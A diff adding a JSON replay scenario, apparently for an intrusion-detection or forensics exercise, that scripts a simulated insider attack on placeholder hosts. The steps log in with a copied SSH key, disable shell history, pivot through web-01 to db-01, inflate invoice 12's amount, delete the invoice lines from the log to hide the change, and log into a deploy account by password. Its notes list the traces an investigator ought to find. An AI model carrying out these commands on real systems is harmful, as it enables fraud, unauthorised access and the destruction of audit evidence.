@@ -1,0 +1,80 @@
+{
+  "notes": "Terminal sessions with typed commands, as a person's are. The change goes through the bookkeeping tool with the invoice's own order number, as a normal correction does. What is not normal: the new amount is not the order total; Maria is logged in from her usual address at the same time (+400 to +640); at +575 the lines of invoice 12 are taken out of the invoice log, and that command is in auth.log; at +690 the same address uses the deploy password.",
+  "steps": [
+    {
+      "at": -110,
+      "source": "intruder.0",
+      "label": "first login as Maria with the copied key; ordinary look",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo tail -n 5 /var/log/offsite-backup.log > /dev/null'; sleep 40; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/km -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mreyes@{target}"
+    },
+    {
+      "at": 160,
+      "source": "intruder.0",
+      "label": "quiet: through web-01 to db-01; read the invoice log",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'tail -n 5 /var/log/larkspur-invoices.log > /dev/null'; sleep 100; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/km -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/km -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p mreyes@{target}\" mreyes@10.20.0.20"
+    },
+    {
+      "at": 430,
+      "source": "intruder.0",
+      "label": "the change: through web-01 to db-01 while Maria is at work from home; correct invoice 12 to more than its order total",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'printf \"invoice 12\\namount 71500\\norder LC-20184\\n\" | sudo -n /usr/local/sbin/larkspur-invoice-adjust'; sleep 90; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/km -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/km -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p mreyes@{target}\" mreyes@10.20.0.20 | grep -q '67500 -> 71500'",
+      "leaves": [
+        {
+          "host": "db-01",
+          "path": "/var/log/larkspur-invoices.log",
+          "has": "invoice=12 old=67500 new=71500"
+        }
+      ]
+    },
+    {
+      "at": 575,
+      "source": "intruder.0",
+      "label": "cover: take the lines of invoice 12 out of the invoice log (the sudo line stays in auth.log)",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n sh -c \"grep -v -e invoice=12 /var/log/larkspur-invoices.log > /var/tmp/.inv; cat /var/tmp/.inv > /var/log/larkspur-invoices.log; rm -f /var/tmp/.inv\"'; sleep 25; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/km -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/km -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p mreyes@{target}\" mreyes@10.20.0.20",
+      "leaves": [
+        {
+          "host": "db-01",
+          "path": "/var/log/larkspur-invoices.log",
+          "lacks": "invoice=12 old=67500 new=71500"
+        },
+        {
+          "host": "db-01",
+          "path": "/var/log/auth.log",
+          "has": "/var/log/larkspur-invoices.log > /var/tmp/.inv"
+        }
+      ]
+    },
+    {
+      "at": 690,
+      "source": "intruder.0",
+      "label": "login to deploy with its password, from the address that used Maria's key",
+      "timeout": 60,
+      "run": "SSHPASS='{secret:dpw}' sshpass -e ssh -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 deploy@{target} 'uptime > /dev/null'"
+    },
+    {
+      "at": 800,
+      "source": "intruder.1",
+      "label": "login as Maria from the second address; ordinary look",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo tail -n 5 /var/log/offsite-backup.log > /dev/null'; sleep 80; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/km -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mreyes@{target}"
+    },
+    {
+      "at": 980,
+      "source": "intruder.1",
+      "label": "login to deploy again after the batch",
+      "timeout": 60,
+      "run": "SSHPASS='{secret:dpw}' sshpass -e ssh -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 deploy@{target} 'uptime > /dev/null'"
+    },
+    {
+      "at": 1060,
+      "source": "intruder.1",
+      "label": "last login as Maria; ordinary look",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo tail -n 5 /var/log/offsite-backup.log > /dev/null'; sleep 45; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/km -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mreyes@{target}"
+    }
+  ]
+}
